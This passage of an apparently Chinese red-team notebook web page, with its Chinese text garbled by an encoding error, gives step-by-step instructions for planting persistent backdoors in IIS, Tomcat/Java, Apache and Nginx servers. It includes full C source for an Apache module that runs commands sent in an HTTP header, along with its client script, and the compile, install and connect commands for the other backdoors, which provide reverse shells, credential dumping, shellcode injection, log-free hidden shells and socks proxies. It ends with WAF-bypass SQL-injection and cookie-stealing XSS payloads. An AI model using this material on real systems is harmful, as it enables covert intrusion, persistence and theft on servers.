		<span class="token keyword">function</span> <span class="token keyword">get</span> IHttpHandler<span class="token punctuation">.</span><span class="token function">IsReusable</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> Boolean<span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>ä½¿ç”¨jscç¼–è¯‘
&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe /t:library -out:C:\inetpub\wwwroot\Bin\IsapiModule.Handler.dll C:\inetpub\wwwroot\bin\code.js
</code></pre>
<p><img src="./img/595.png" alt="image"></p>
<pre><code>ç¼–è¾‘web.configï¼Œæ·»åŠ æ˜ å°„ï¼Œè¿™é‡ŒæŒ‡å®šçš„åç¼€æ˜¯.iis
&lt;system.webServer&gt; 
&lt;modules runAllManagedModulesForAllRequests=&quot;true&quot;/&gt; &lt;directoryBrowse enabled=&quot;true&quot;/&gt;
&lt;staticContent&gt;
 &lt;mimeMap fileExtension=&quot;.json&quot; mimeType=&quot;application/json&quot; /&gt; 
 &lt;/staticContent&gt; 
&lt;handlers&gt;
 &lt;add name=&quot;PageHandlerFactory-ISAPI-2.0-32-1&quot; path=&quot;*.iis&quot; verb=&quot;*&quot; type=&quot;IsapiModule.Handler&quot; preCondition=&quot;integratedMode&quot;/&gt;
 &lt;/handlers&gt;
&lt;/system.webServer&gt;
å·²è‡ªåŠ¨åŠ å…¥äº†æ˜ å°„ã€‚ç°åœ¨éšä¾¿è®¿é—®ä¸ªiisåç¼€çš„æ–‡ä»¶ã€‚
</code></pre>
<p><img src="./img/596.png" alt="image"><br><img src="./img/597.png" alt="image"></p>
<pre><code>å¯ä½¿ç”¨èœåˆ€ç›´æ¥è¿æ¥
</code></pre>
<p><img src="./img/598.png" alt="image"><br><img src="./img/599.png" alt="image"></p>
<h3 id="IIS-RAID"><a href="#IIS-RAID" class="headerlink" title="IIS_RAID"></a>IIS_RAID</h3><pre><code>From:https://github.com/0x09AL/IIS-Raid
åœ¨vs2019ä¸‹ç¼–è¯‘
åœ¨Functions.hä¸­ä¿®æ”¹è¿æ¥å¯†ç ï¼Œpassfileæ˜¯dumpä¸‹æ¥çš„å¯†ç ä¿å­˜çš„ä½ç½®ï¼Œcom_headeræ˜¯åé—¨å’ŒæœåŠ¡å™¨é€šä¿¡çš„è¯·æ±‚å¤´ã€‚
</code></pre>
<p><img src="./img/600.png" alt="image"></p>
<pre><code>æ‰“å¼€é¡¹ç›®ä¿®æ”¹å®Œä½ çš„å¯†ç ï¼Œç›´æ¥ctrl+Bç”Ÿæˆè§£å†³æ–¹æ¡ˆå³å¯(è¿™é‡Œç”Ÿæˆçš„æ˜¯releaseç‰ˆæœ¬)
Dllä¼ åˆ°æœåŠ¡å™¨ï¼Œæ”¹ä¸ªåå­—ï¼Œæ‰§è¡Œæ·»åŠ æ¨¡å—
&gt;C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:IsapiDotNet /image:&quot;c:\windows\system32\inetsrv\IsapiDotNet.dll&quot; /add:true
</code></pre>
<p><img src="./img/601.png" alt="image"></p>
<pre><code>åœ¨æ¨¡å—ä¸­å¯ä»¥çœ‹åˆ°å·²ç»å­˜åœ¨äº†
</code></pre>
<p><img src="./img/602.png" alt="image"></p>
<pre><code>è¿œç¨‹è¿æ¥
&gt;python3 iis_controller.py --url http://192.168.0.98 --password thisismykey
æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼æ˜¯
&gt;cmd +å‘½ä»¤
</code></pre>
<p><img src="./img/603.png" alt="image"></p>
<pre><code>Dumpå‘½ä»¤å¯ä»¥dumpä¸‹æ¥IISç«™ç‚¹çš„ç™»å½•çš„ä¿¡æ¯ï¼Œä¿å­˜åœ¨è®¾ç½®çš„ä½ç½®ã€‚
Injectå¯ä»¥æ‰§è¡Œshellcode
Cs/msfç”Ÿæˆrawæ ¼å¼çš„shellcode
&gt;inject ä½ç½®
</code></pre>
<p><img src="./img/604.png" alt="image"></p>
<h3 id="JAVA-Web-Backdoor"><a href="#JAVA-Web-Backdoor" class="headerlink" title="JAVA Web Backdoor"></a>JAVA Web Backdoor</h3><pre><code>From:https://www.freebuf.com/articles/web/172753.html
https://github.com/rebeyond/memShell
å½“è·å–ä¸€ä¸ªwebshellæˆ–bashshellæƒé™æ—¶ï¼Œä¸‹è½½åé—¨æ‰§è¡Œæ³¨å…¥è¿›ç¨‹å½¢æˆæ— æ–‡ä»¶å¤æ´»åé—¨
ä¸‹è½½åè§£å‹åˆ°ä»»æ„webç›®å½•
</code></pre>
<p><img src="./img/605.png" alt="image"></p>
<pre><code>å¾—åˆ°2ä¸ªjaræ–‡ä»¶
æ‰§è¡Œï¼Œpasswordè®¾ç½®ä¸ºä½ çš„å¯†ç 
&gt;java -jar inject.jar password
</code></pre>
<p><img src="./img/606.png" alt="image"></p>
<pre><code>æ³¨å…¥æˆåŠŸï¼Œåœ¨webä»»æ„é¡µé¢ä»»æ„urlæ‰§è¡Œå‘½ä»¤
http://192.168.0.121:8080/css/app.css?pass_the_world=password
</code></pre>
<p><img src="./img/607.png" alt="image"></p>
<pre><code>å¯æ‰§è¡Œå‘½ä»¤ï¼Œåå¼¹shellï¼Œä¸Šä¼ /ä¸‹è½½æ–‡ä»¶ï¼Œåˆ—ç›®å½•ï¼Œè¯»æ–‡ä»¶ï¼Œæ·»åŠ ä»£ç†ï¼Œè¿æ¥èœåˆ€
</code></pre>
<p><img src="./img/608.png" alt="image"></p>
<h3 id="Tomcat-JSP-HideShell"><a href="#Tomcat-JSP-HideShell" class="headerlink" title="Tomcat JSP HideShell"></a>Tomcat JSP HideShell</h3><pre><code>From:https://mp.weixin.qq.com/s/7b3Fyu_K6ZRgKlp6RkdYoA
https://github.com/QAX-A-Team/HideShell
æŠŠè‡ªå·±çš„shellå’Œhideshellä¼ å…¥é¶æœºï¼Œå…ˆè®¿é—®è‡ªå·±çš„shellï¼Œç›®çš„æ˜¯ä¸ºäº†è®© Tomcat å°†å®ƒç¼–è¯‘ï¼Œå¹¶ç”Ÿæˆ JspServletWrapper ä¿å­˜åœ¨ JspRuntimeContext ä¸­ã€‚
</code></pre>
<p><img src="./img/609.png" alt="image"></p>
<pre><code>å†è®¿é—®hideshell.jspï¼Œç‚¹å‡»hideä½ çš„shellã€‚
</code></pre>
<p><img src="./img/610.png" alt="image"></p>
<pre><code>å·²ç»éšè—äº†
</code></pre>
<p><img src="./img/611.png" alt="image"><br><img src="./img/612.png" alt="image"></p>
<pre><code>å†è®¿é—®hideshell.jspï¼Œå¯ä»¥çœ‹åˆ°éšè—åçš„shellçš„æ–‡ä»¶åã€‚
</code></pre>
<p><img src="./img/613.png" alt="image"></p>
<pre><code>è®¿é—®çœ‹çœ‹
</code></pre>
<p><img src="./img/614.png" alt="image"></p>
<pre><code>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥æŠŠhideshellè‡ªèº«éšè—äº†ï¼Œé‚£è®¿é—®å®ƒçš„æ–¹å¼å°±æ˜¯hidden-hideshell.jsp
</code></pre>
<p><img src="./img/615.png" alt="image"></p>
<pre><code>ç›®å½•é‡Œå•¥éƒ½æ²¡äº†
</code></pre>
<p><img src="./img/616.png" alt="image"></p>
<pre><code>æ­¤æ–¹å¼éšè—ä¹‹åè¯·æ±‚ä¸ä¼šäº§ç”Ÿæ—¥å¿—
</code></pre>
<p><img src="./img/617.png" alt="image"></p>
<pre><code>é‚£å¦‚æœæŠŠshelltestæ–‡ä»¶å¤¹åˆ æ‰æƒé™è¿˜ä¼šåœ¨å—ï¼Ÿ
</code></pre>
<p><img src="./img/618.png" alt="image"></p>
<pre><code>æ˜¯åœ¨çš„
</code></pre>
<p><img src="./img/619.png" alt="image"></p>
<h3 id="Apache-Moduleåé—¨1"><a href="#Apache-Moduleåé—¨1" class="headerlink" title="Apache Moduleåé—¨1"></a>Apache Moduleåé—¨1</h3><pre><code>From:https://github.com/WangYihang/Apache-HTTP-Server-Module-Backdoor
ç”Ÿæˆæ¨¡æ¿ç»“æ„
&gt;apxs -g -n auth
</code></pre>
<p><img src="./img/620.png" alt="image"></p>
<pre><code>ç¼–è¾‘mod_auth.cæ–‡ä»¶
</code></pre>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"httpd.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"http_config.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"http_protocol.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"ap_config.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">auth_handler</span><span class="token punctuation">(</span>request_rec <span class="token operator">*</span>r<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> <span class="token class-name">apr_array_header_t</span>    <span class="token operator">*</span>fields<span class="token punctuation">;</span>
    <span class="token keyword">int</span>                            i<span class="token punctuation">;</span>
    <span class="token class-name">apr_table_entry_t</span>           <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span> FLAG <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    fields <span class="token operator">=</span> <span class="token function">apr_table_elts</span><span class="token punctuation">(</span>r<span class="token operator">-></span>headers_in<span class="token punctuation">)</span><span class="token punctuation">;</span>
    e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">apr_table_entry_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> fields<span class="token operator">-></span>elts<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> fields<span class="token operator">-></span>nelts<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>e<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">,</span> <span class="token string">"Authorizations"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            FLAG <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">char</span> <span class="token operator">*</span> command <span class="token operator">=</span> e<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>val<span class="token punctuation">;</span>
        FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">popen</span><span class="token punctuation">(</span>command<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> counter <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span><span class="token punctuation">(</span>counter<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            counter <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">ap_rwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> counter<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">pclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> DONE<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> DECLINED<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">auth_register_hooks</span><span class="token punctuation">(</span><span class="token class-name">apr_pool_t</span> <span class="token operator">*</span>p<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token function">ap_hook_handler</span><span class="token punctuation">(</span>auth_handler<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> APR_HOOK_MIDDLE<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
module AP_MODULE_DECLARE_DATA auth_module <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    STANDARD20_MODULE_STUFF<span class="token punctuation">,</span> 
    <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* create per-dir    config structures */</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* merge  per-dir    config structures */</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* create per-server config structures */</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* merge  per-server config structures */</span>
    <span class="token constant">NULL</span><span class="token punctuation">,</span>                  <span class="token comment">/* table of config file commands       */</span>
    auth_register_hooks  <span class="token comment">/* register hooks                      */</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>ç¼–è¯‘åé‡å¯apache
&gt;apxs -i -a -c mod_auth.c &amp;&amp; service apache2 restart
</code></pre>
<p><img src="./img/621.png" alt="image"></p>
<pre><code>åŸæ–‡ä»¶æ¥å—çš„å¤´æ˜¯backdoorå¤ªæ˜æ˜¾ï¼Œè¿™é‡Œæ¢æˆäº†Authorizations
</code></pre>
<p><img src="./img/622.png" alt="image"></p>
<pre><code>æˆ–ä½¿ç”¨pythonæ¥æ‰§è¡Œ
</code></pre>
<p><img src="./img/623.png" alt="image"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"Authorizations"</span><span class="token punctuation">:</span> command
    <span class="token punctuation">&#125;</span>
    url <span class="token operator">=</span> <span class="token string">"http://%s:%d/"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
    content <span class="token operator">=</span> response<span class="token punctuation">.</span>content
    <span class="token keyword">print</span> content
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span> <span class="token string">"Usage : "</span>
        <span class="token keyword">print</span> <span class="token string">"\tpython %s [HOST] [PORT]"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    host <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    port <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        command <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token string">"$ "</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> command <span class="token operator">==</span> <span class="token string">"exit"</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        exploit<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> command<span class="token punctuation">)</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="Apache-Moduleåé—¨2"><a href="#Apache-Moduleåé—¨2" class="headerlink" title="Apache Moduleåé—¨2"></a>Apache Moduleåé—¨2</h3><pre><code>From:https://github.com/VladRico/apache2_BackdoorMod
.loadæ–‡ä»¶ä¼ å…¥/etc/apache2/mods-available/ç›®å½•ï¼Œ.soæ–‡ä»¶ä¼ å…¥/usr/lib/apache2/modules/ç›®å½•
å¯åŠ¨åé—¨æ¨¡å—ï¼Œé‡å¯apache
&gt;a2enmod backdoor&amp;service apache2 restart
</code></pre>
<p><img src="./img/624.png" alt="image"></p>
<pre><code>Cookieé‡Œæ·»åŠ å­—æ®µpassword=backdoor
è®¿é—®http://ip/pingè¿”å›å¦‚ä¸‹å›¾è¯´æ˜åé—¨æ­£å¸¸å…è®¸
</code></pre>
<p><img src="./img/625.png" alt="image"></p>
<pre><code>è®¿é—®http://ip/bind/12345 å¼€å¯æ­£å‘è¿æ¥ï¼Œæ”»å‡»æœºæ‰§è¡Œnc ip 12345å³å¯
</code></pre>
<p><img src="./img/626.png" alt="image"></p>
<pre><code>è®¿é—®http://ip/revtty/192.168.0.107/12138 å¼€å¯åå‘è¿æ¥ï¼Œæ”»å‡»æœº109æ‰§è¡Œncç›‘å¬12138å³å¯
</code></pre>
<p><img src="./img/627.png" alt="image"></p>
<pre><code>è®¿é—®http://ip/proxy/1337å¼€å¯socksä»£ç†
</code></pre>
<p><img src="./img/628.png" alt="image"><br><img src="./img/629.png" alt="image"><br><img src="./img/630.png" alt="image"></p>
<pre><code>æƒ³è¦ç»“æŸsocksä»£ç†å¯æ‰§è¡Œ
&gt;echo &quot;imdonewithyou&quot; |nc 192.168.0.111 1337
</code></pre>
<p><img src="./img/631.png" alt="image"></p>
<pre><code>å³å¯ç»“æŸsocksä»£ç†
ä»¥ä¸ŠåŸä½œè€…çš„æ–‡ä»¶å‘½åbackdoorå¤ªæ˜æ˜¾ï¼Œå¯ä»¥è‡ªå·±ä¿®æ”¹æ–‡ä»¶é‡æ–°ç¼–è¯‘
åˆ›å»ºæ¨¡æ¿ç»“æ„å‘½åä¸ºphpmodev
</code></pre>
<p><img src="./img/632.png" alt="image"><br><img src="./img/633.png" alt="image"></p>
<pre><code>ä¿®æ”¹cookieå†…å®¹ä¸ºè¿·æƒ‘å­—æ®µAuthorizations=PHPSESSIONID
</code></pre>
<p><img src="./img/634.png" alt="image"></p>
<h3 id="Apache-Moduleåé—¨3"><a href="#Apache-Moduleåé—¨3" class="headerlink" title="Apache Moduleåé—¨3"></a>Apache Moduleåé—¨3</h3><pre><code>From: https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247491179&amp;idx=1&amp;sn=ab26fe36ac74f5b140e91279ae8018c7
ç”Ÿæˆæ¨¡æ¿ç»“æ„
&gt;apxs -g -n phpdevmod
</code></pre>
<p><img src="./img/635.png" alt="image"></p>
<pre><code>ç¼–è¾‘mod_phpdevmod.cæ–‡ä»¶
ç¼–è¯‘
&gt;make -e CC=x86_64-linux-gnu-g++
</code></pre>
<p><img src="./img/636.png" alt="image"></p>
<pre><code>ç”Ÿæˆçš„.soæ–‡ä»¶åœ¨/.libsç›®å½•ä¸‹
</code></pre>
<p><img src="./img/637.png" alt="image"></p>
<pre><code>å°†å…¶å¤åˆ¶åˆ°/usr/lib/apache2/modules/ç›®å½•
ä¿®æ”¹/etc/apache2/mods-enabled/php7.0.loadæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹
LoadModule phpdevmod_module /usr/lib/apache2/modules/mod_phpdevmod.so
&lt;Location /qq.jpg&gt;    #å¯ä»¥è®¾ç½®ä¸ºä»»ä½•ä¸å­˜åœ¨çš„æ–‡ä»¶
    setHandler phpdevmod
&lt;/Location&gt;
</code></pre>
<p><img src="./img/638.png" alt="image"></p>
<pre><code>éœ€é‡å¯apacheæœåŠ¡
è®¿é—®åé—¨æ–¹å¼http://ip/qq.jpg?å‘½ä»¤çš„urlç¼–ç 
ç›´æ¥è®¿é—®åé—¨æ–‡ä»¶
</code></pre>
<p><img src="./img/639.png" alt="image"></p>
<pre><code>636174202F6574632F706173737764ä¸ºcat /etc/passwdçš„urlç¼–ç 
</code></pre>
<p><img src="./img/640.png" alt="image"></p>
<h3 id="Nginx-Luaåé—¨"><a href="#Nginx-Luaåé—¨" class="headerlink" title="Nginx Luaåé—¨"></a>Nginx Luaåé—¨</h3><pre><code>From:https://github.com/netxfly/nginx_lua_security
https://github.com/Y4er/Y4er.com/blob/251d88d8a3cf21e9bafe15c43d7900ffeacfa7ea/content/post/nginx-lua-backdoor.md
åé—¨åˆ©ç”¨çš„å‰ææ˜¯è·å–åˆ°rootæƒé™ï¼Œnginxå®‰è£…æœ‰luaæ¨¡å—ã€‚
åœ¨nginx.confä¸­httpèŠ‚å¤„æ·»åŠ ï¼ŒæŒ‡å®šluaè„šæœ¬ä½ç½®ï¼Œä»¥åŠnginxå¯åŠ¨æ—¶åŠ è½½çš„è„šæœ¬
</code></pre>
<p><img src="./img/641.png" alt="image"></p>
<pre><code>åœ¨luaç›®å½•/waf/ä¸­æ–°å»ºInit.luaï¼Œå†…å®¹å¦‚ä¸‹ï¼Œrequire nginxè¡¨ç¤ºåŠ è½½nginx.luaä¸­çš„æ¨¡å—ã€‚
</code></pre>
<p><img src="./img/642.png" alt="image"></p>
<pre><code>/waf/ç›®å½•ä¸­æ–°å»ºnginx.luaå®ç°æ‰§è¡Œå‘½ä»¤ï¼Œå‚æ•°ä¸ºwafã€‚
</code></pre>
<p><img src="./img/643.png" alt="image"></p>
<pre><code>åœ¨nginxé…ç½®æ–‡ä»¶ä¸­åŠ å…¥locationã€‚
</code></pre>
<p><img src="./img/644.png" alt="image"></p>
<pre><code>æ•ˆæœï¼š
</code></pre>
<p><img src="./img/645.png" alt="image"></p>
<h3 id="PwnNginx"><a href="#PwnNginx" class="headerlink" title="PwnNginx"></a>PwnNginx</h3><pre><code>From:https://github.com/t57root/pwnginx
è§£å‹å¥½åç¼–è¯‘å®¢æˆ·ç«¯
&gt;make
</code></pre>
<p><img src="./img/646.png" alt="image"></p>
<pre><code>ç¼–è¾‘nginxçš„æºæ–‡ä»¶/src/core/nginx.cæ‰¾åˆ°configure arguments:åœ¨åé¢æ·»åŠ --prefix=/usr/local/nginx\næŒ‡å®šçš„æ˜¯nginxå®‰è£…çš„ç›®å½•
</code></pre>
<p><img src="./img/647.png" alt="image"></p>
<pre><code>é‡æ–°ç¼–è¯‘nginxæ·»åŠ åé—¨æ¨¡å—
&gt;./configure --prefix=/usr/local/nginx/ --add-module=/tmp/pwnginx-master/module
</code></pre>
<p><img src="./img/648.png" alt="image"></p>
<pre><code>&gt;make
</code></pre>
<p><img src="./img/649.png" alt="image"></p>
<pre><code>è¦†ç›–æ–°çš„nginxåˆ°åŸnginxç›®å½•
&gt;cp -f objs/nginx /usr/local/nginx/sbin/nginx
</code></pre>
<p><img src="./img/650.png" alt="image"></p>
<pre><code>é‡å¯nginx
&gt;killall nginx&amp;/usr/local/nginx/sbin/nginx
è¿æ¥
&gt;./pwnginx shell ç›®æ ‡æœº nginxç«¯å£ å¯†ç 
é»˜è®¤å¯†ç æ˜¯t57rootï¼Œå¯†ç çš„é…ç½®æ–‡ä»¶åœ¨pwnginx-master\module\config.hæ–‡ä»¶å¤¹ä¸­ï¼Œå¯åœ¨é‡æ–°ç¼–è¯‘nginxå‰ä¿®æ”¹å¯†ç 
</code></pre>
<p><img src="./img/651.png" alt="image"><br><img src="./img/652.png" alt="image"></p>
<pre><code>æ­¤åé—¨ä¹Ÿå¯å¼€å¯sockséš§é“
</code></pre>
<h1 id="æ¸—é€å’Œçº¢é˜Ÿtips"><a href="#æ¸—é€å’Œçº¢é˜Ÿtips" class="headerlink" title="æ¸—é€å’Œçº¢é˜Ÿtips"></a>æ¸—é€å’Œçº¢é˜Ÿtips</h1><h2 id="çˆ¶è¿›ç¨‹ç ´å"><a href="#çˆ¶è¿›ç¨‹ç ´å" class="headerlink" title="çˆ¶è¿›ç¨‹ç ´å"></a>çˆ¶è¿›ç¨‹ç ´å</h2><pre><code>å‘½ä»¤explorer.exe / rootä¸cmd.exe / cç±»ä¼¼ï¼Œåªä¸è¿‡ä½¿ç”¨explorerä¼šç ´åè¿›ç¨‹æ ‘ï¼Œä¼šåˆ›å»ºæ–°å®ä¾‹explorer.exeï¼Œä½¿ä¹‹æˆä¸ºæ–°å®ä¾‹ä¸‹çš„å­è¿›ç¨‹
</code></pre>
<p><img src="./img/665.png" alt="image"><br><img src="./img/666.png" alt="image"></p>
<h2 id="loTé«˜é¢‘ç‡è´¦æˆ·å¯†ç "><a href="#loTé«˜é¢‘ç‡è´¦æˆ·å¯†ç " class="headerlink" title="loTé«˜é¢‘ç‡è´¦æˆ·å¯†ç "></a>loTé«˜é¢‘ç‡è´¦æˆ·å¯†ç </h2><p><img src="./img/678.png" alt="image"></p>
<h2 id="Bypass-mod-security"><a href="#Bypass-mod-security" class="headerlink" title="Bypass mod_security"></a>Bypass mod_security</h2><pre><code>Xsså’Œæ³¨å…¥bypass mod_security
/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4... â€“
&lt;marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)&gt;Y000&lt;/marquee&gt;
/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5â€”
%75%6e%69on = union 
%73%65%6cect = select 
%75%6e%69 = uni = url encode 
%73%65%6c = sel = url encode
</code></pre>
<h2 id="æŸ¥æ‰¾gitå’Œsvnçš„å­—å…¸"><a href="#æŸ¥æ‰¾gitå’Œsvnçš„å­—å…¸" class="headerlink" title="æŸ¥æ‰¾gitå’Œsvnçš„å­—å…¸"></a>æŸ¥æ‰¾gitå’Œsvnçš„å­—å…¸</h2><p><img src="./img/679.jpg" alt="image"></p>
<h2 id="Top-25-é‡å®šå‘dorks"><a href="#Top-25-é‡å®šå‘dorks" class="headerlink" title="Top 25 é‡å®šå‘dorks"></a>Top 25 é‡å®šå‘dorks</h2><p><img src="./img/680.jpg" alt="image"></p>
<h2 id="ä½¿ç”¨grepå¿«é€Ÿå»é™¤åƒåœ¾æ•°æ®"><a href="#ä½¿ç”¨grepå¿«é€Ÿå»é™¤åƒåœ¾æ•°æ®" class="headerlink" title="ä½¿ç”¨grepå¿«é€Ÿå»é™¤åƒåœ¾æ•°æ®"></a>ä½¿ç”¨grepå¿«é€Ÿå»é™¤åƒåœ¾æ•°æ®</h2><pre><code>curl http://host.xx/file.js | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;*
cat file | grep -Eo &quot;(http|https)://[a-zA-Z0-9./?=_-]*&quot;*
</code></pre>
<p><img src="./img/684.png" alt="image"><br><img src="./img/685.png" alt="image"></p>
